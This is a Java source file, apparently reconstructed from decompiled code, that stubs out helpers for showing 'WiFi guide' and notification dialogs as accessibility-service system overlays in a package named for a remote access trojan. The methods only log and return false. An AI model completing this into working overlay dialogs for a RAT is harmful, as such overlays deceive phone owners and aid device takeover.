package com.vendor.rat.helper;

import android.app.AlertDialog;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;

import java.lang.ref.WeakReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * Vendor: com.guard.wallet.helper.n
 * Manages WiFi guide and notification dialogs shown as system overlays.
 */
public abstract class WifiGuideDialogHelper {

    public static WeakReference<AlertDialog> dialogRef;
    public static final ReentrantLock lock = new ReentrantLock();

    /**
     * Show WiFi guide dialog with dismiss callback. Vendor: n.a()
     */
    public static boolean showWifiGuideDialog(String title, String message, String buttonText, String iconUrl, String imageUrl) {
        // ADAPT: vendor checks MyAccessibilityService.P() != null
        // TODO: VENDOR_VERIFY - full dialog with icon download
        try {
            if (buttonText == null || buttonText.isEmpty()) {
                buttonText = "OK";
            }
            // ADAPT: vendor creates AlertDialog with system overlay type 2032
            // Sets icon from iconUrl or downloads from imageUrl
            // Uses DialogClickListener(0) for positive button
            // Uses DialogDismissListener(0) for dismiss
            Log.d("WifiGuideDialogHelper", "showWifiGuideDialog: " + title);
            return false; // TODO: VENDOR_VERIFY - return true when dialog shown
        } catch (Exception e) {
            Log.e("WifiGuideDialogHelper", "showWifiGuideDialog error", e);
            return false;
        }
    }

    /**
     * Show notification dialog with launch action. Vendor: n.b()
     */
    public static boolean showNotifyDialog(String title, String message, String buttonText, String iconUrl, String imageUrl) {
        // ADAPT: vendor checks MyAccessibilityService.P() != null
        try {
            if (buttonText == null || buttonText.isEmpty()) {
                buttonText = "OK";
            }
            // ADAPT: vendor creates AlertDialog with NotifyClickListener
            // and system overlay type 2032
            Log.d("WifiGuideDialogHelper", "showNotifyDialog: " + title);
            return false; // TODO: VENDOR_VERIFY - return true when dialog shown
        } catch (Exception e) {
            Log.e("WifiGuideDialogHelper", "showNotifyDialog error", e);
            return false;
        }
    }

    /**
     * Show WiFi guide dialog with connectivity check. Vendor: n.c()
     */
    public static boolean showWifiGuideWithCheck(String title, String message, String buttonText, String iconUrl, String imageUrl) {
        ReentrantLock l = lock;
        if (!l.tryLock()) {
            return false;
        }
        WeakReference<AlertDialog> ref = dialogRef;
        if (ref != null && ref.get() != null) {
            l.unlock();
            return false;
        }
        // ADAPT: vendor checks WiFi connected status via utils.g.z0()
        try {
            if (isMainThread()) {
                showWifiGuideDialog(title, message, buttonText, iconUrl, imageUrl);
            } else {
                new Handler(Looper.getMainLooper()).postDelayed(
                    new DialogRunnable(title, message, buttonText, iconUrl, imageUrl, 1), 300L);
            }
        } catch (Exception e) {
            Log.e("WifiGuideDialogHelper", "showWifiGuideWithCheck error", e);
        }
        l.unlock();
        return true;
    }

    /**
     * Show notification dialog with thread check. Vendor: n.d()
     */
    public static boolean showNotifyWithCheck(String title, String message, String buttonText, String iconUrl, String imageUrl) {
        ReentrantLock l = lock;
        if (!l.tryLock()) {
            return false;
        }
        try {
            if (isMainThread()) {
                showNotifyDialog(title, message, buttonText, iconUrl, imageUrl);
            } else {
                new Handler(Looper.getMainLooper()).postDelayed(
                    new DialogRunnable(title, message, buttonText, iconUrl, imageUrl, 0), 300L);
            }
        } catch (Exception e) {
            Log.e("WifiGuideDialogHelper", "showNotifyWithCheck error", e);
        }
        l.unlock();
        return true;
    }

    private static boolean isMainThread() {
        return Looper.myLooper() == Looper.getMainLooper();
    }
}